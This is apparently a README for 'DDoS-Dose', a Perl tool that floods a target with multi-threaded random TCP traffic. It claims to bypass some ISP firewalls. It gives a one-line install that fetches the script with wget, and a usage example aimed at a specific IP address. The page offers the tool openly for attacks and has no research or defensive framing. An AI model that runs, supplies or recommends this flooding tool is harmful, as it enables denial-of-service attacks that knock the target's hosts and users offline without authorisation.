
# Script for DDoS-Dose !

## Features

- Generate Random TCP Traffic
- To Target Port & from Random Port
- Require HPC (High Performance Computing) Server
- Can bypass some ISP Firewalls
- Language: Perl
- multi-threads
## Installation

One Line Setup for Debian Based distro ~ Ubuntu, Debian

```bash
  apt update -y && apt install perl -y && apt install wget -y && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer4/TCP/random-tcp%20%7C%20ID%3AA1/random-tcp.pl && chmod 777 *

```
## Usage

```
perl random-tcp.pl 162.241.27.65 100
perl random-tcp.pl <target ip> <number of threads>
```
```
- This script pre-configured to send traffic to Specif port, (Line18) Can be Changed & from random port (Line17)
- This script pre-configured to send random packet size, (Line19), Can be changed!
- Can adjust time by "timeout 30" command,
```

## Authors

- [@cyberceros](https://www.github.com/cyberceros)
## Feedback

If you have any feedback, please reach out to us at n@dultr.in
